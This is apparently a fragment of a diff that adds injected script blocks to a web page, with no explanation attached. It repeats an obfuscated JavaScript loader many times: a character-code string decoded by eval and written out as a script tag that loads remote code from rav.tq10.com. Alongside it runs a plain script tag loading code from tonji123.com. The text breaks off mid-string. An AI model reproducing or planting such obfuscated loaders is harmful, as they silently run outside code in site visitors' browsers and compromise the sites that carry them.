+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,11
+
+
